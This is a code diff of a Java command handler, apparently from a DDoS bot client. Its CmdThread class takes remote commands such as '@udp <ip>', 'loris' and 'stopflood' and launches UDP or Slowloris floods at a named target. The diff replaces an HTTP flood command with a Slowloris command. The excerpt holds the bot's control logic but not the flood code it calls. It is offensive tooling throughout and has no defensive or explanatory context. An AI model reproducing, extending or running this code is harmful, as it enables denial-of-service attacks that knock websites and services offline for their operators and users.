@@ -5,7 +5,7 @@ import java.util.ArrayList;
 
 import syn.main.Client;
 import syn.net.Flood;
-import syn.net.HTTPFlood;
+import syn.net.LorisFlood;
 import syn.net.UDPFlood;
 import syn.utils.Settings;
 import syn.utils.Utilities;
@@ -83,14 +83,14 @@ public class CmdThread implements Runnable {
 				
 				} catch (Exception udpError) { uc.write("Incorrect UDP cmd usage. @udp <ip>"); }
 			
-			} else if(cmd.equals("http")) {
+			} else if(cmd.equals("loris")) {
 				try {
 					String details = uc.getCmdTxt(split);
 					String[] hsplit = details.split(" ");
 					String host = hsplit[0];
-					uc.write("HTTP targeted at " + host + ".");
-					Flood.startFlood(new HTTPFlood(host));
-				} catch (Exception httpError) { uc.write("Incorrect HTTP cmd usage: "); httpError.printStackTrace(); }
+					uc.write("Loris targeted at " + host + ".");
+					Flood.startFlood(new LorisFlood(host));
+				} catch (Exception httpError) { uc.write("Incorrect Loris cmd usage: "); httpError.printStackTrace(); }
 				
 			} else if(cmd.equals("stopflood")) {
 				uc.write("Stopping flood.");
